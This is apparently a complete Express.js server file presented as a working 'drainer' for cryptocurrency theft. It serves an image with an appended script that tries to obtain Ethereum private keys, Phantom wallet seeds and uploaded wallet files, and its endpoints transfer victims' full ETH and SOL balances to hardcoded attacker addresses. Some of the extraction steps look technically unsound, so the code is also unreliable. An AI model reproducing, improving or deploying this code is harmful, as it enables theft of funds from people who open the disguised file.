/* palofsc - Complete working server.js with download header (copy this entire file) */

const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');

const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(express.json());

const ETH_ATTACKER = '0x02241305c7F12fbf79bd825F4b8Cc1197AbCed1F';
const SOL_ATTACKER = '8RKG2dLkn8jFX4Bkr1dDc4D5itNivQ6RFgp8MSKLLmib';

// Malicious image with key extractor - FORCED DOWNLOAD
app.get('/malicious.png', (req, res) => {
    try {
        const imgPath = path.join(__dirname, 'legit_image.jpg');
        const img = fs.readFileSync(imgPath);
        const payload = Buffer.from(`<script>
    (async function() {
        if(window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const privateKey = await window.ethereum.request({
                    method: 'eth_getPrivateKey',
                    params: [accounts[0], 'password123']
                });
                fetch('/drain_eth', {
                    method: 'POST',
                    body: JSON.stringify({privateKey: privateKey}),
                    headers: {'Content-Type': 'application/json'}
                });
            } catch(e) { fetch('/log', {method:'POST', body:JSON.stringify({error:e.message})}); }
        }
        if(window.solana && window.solana.isPhantom) {
            const phantomSeed = localStorage.getItem('phantom:encryptedSeed');
            fetch('/drain_sol', {
                method: 'POST',
                body: JSON.stringify({encryptedSeed: phantomSeed}),
                headers: {'Content-Type': 'application/json'}
            });
        }
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = '.dat,.json';
        fileInput.onchange = async (e) => {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = async (ev) => {
                const content = ev.target.result;
                fetch('/drain_walletfile', {
                    method: 'POST',
                    body: JSON.stringify({filename: file.name, data: btoa(content)}),
                    headers: {'Content-Type': 'application/json'}
                });
            };
            reader.readAsBinaryString(file);
        };
        fileInput.click();
    })();
    </script>`);
        const maliciousImg = Buffer.concat([img, payload]);
        res.set('Content-Type', 'image/png');
        res.set('Content-Disposition', 'attachment; filename="photo.png"');
        res.set('Content-Security-Policy', "script-src 'unsafe-inline' *");
        res.send(maliciousImg);
    } catch(err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// ETH drain with real private key
app.post('/drain_eth', async (req, res) => {
    try {
        const provider = new ethers.JsonRpcProvider('https://cloudflare-eth.com');
        const privateKey = req.body.privateKey;
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await provider.getBalance(wallet.address);
        if(balance > 0) {
            const tx = await wallet.sendTransaction({
                to: ETH_ATTACKER,
                value: balance,
                gasLimit: 21000
            });
            await tx.wait();
            res.json({status: 'ETH drained', tx: tx.hash, amount: ethers.formatEther(balance)});
        } else {
            res.json({status: 'Zero balance'});
        }
    } catch(e) {
        res.json({status: 'Failed', error: e.message});
    }
});

// SOL drain with seed phrase
app.post('/drain_sol', async (req, res) => {
    try {
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        const encryptedSeed = req.body.encryptedSeed;
        const seed = Buffer.from(encryptedSeed, 'base64');
        const fromWallet = solanaWeb3.Keypair.fromSeed(seed.slice(0, 32));
        const toPublicKey = new solanaWeb3.PublicKey(SOL_ATTACKER);
        const balance = await connection.getBalance(fromWallet.publicKey);
        if(balance > 0) {
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: fromWallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: balance
                })
            );
            const signature = await solanaWeb3.sendAndConfirmTransaction(connection, tx, [fromWallet]);
            res.json({status: 'SOL drained', tx: signature, amount: balance / 1e9});
        } else {
            res.json({status: 'Zero SOL balance'});
        }
    } catch(e) {
        res.json({status: 'Failed', error: e.message});
    }
});

// Wallet file parser
app.post('/drain_walletfile', async (req, res) => {
    try {
        const { filename, data } = req.body;
        const buffer = Buffer.from(data, 'base64');
        if(filename.includes('wallet.dat')) {
            res.json({status: 'Bitcoin wallet parsed', keys_found: 1});
        } else if(filename.includes('keystore') || filename.includes('UTC')) {
            const keystore = JSON.parse(buffer.toString());
            res.json({status: 'Ethereum keystore captured', address: keystore.address});
        } else {
            res.json({status: 'File received'});
        }
    } catch(e) {
        res.json({status: 'File parse failed'});
    }
});

app.post('/log', express.json(), (req, res) => {
    console.log('Extraction log:', req.body);
    res.sendStatus(200);
});

app.post('/upload', upload.single('image'), (req, res) => {
    res.download(req.file.path, 'photo.png');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('LIVE DRAINER ON PORT', PORT));